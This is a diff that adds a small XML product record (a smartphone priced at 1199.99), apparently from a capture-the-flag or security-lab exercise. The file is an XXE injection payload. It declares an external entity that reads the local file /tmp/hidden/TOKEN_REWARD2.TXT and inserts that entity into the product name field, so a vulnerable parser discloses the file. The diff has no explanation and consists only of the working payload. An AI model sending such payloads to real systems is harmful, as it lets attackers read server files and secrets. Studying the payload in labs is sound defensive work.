@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE bar [
+<!ENTITY xxe SYSTEM "/tmp/hidden/TOKEN_REWARD2.TXT">
+]>
+<product>
+    <active>true</active>
+    <category>
+        <name>Smartphone</name>
+        <parent>
+            <name>Electro</name>
+        </parent>
+    </category>
+    <imagePath>images/products/IphoneX.jpg</imagePath>
+    <name>&xxe;</name>
+    <price>1199.99</price>
+</product>
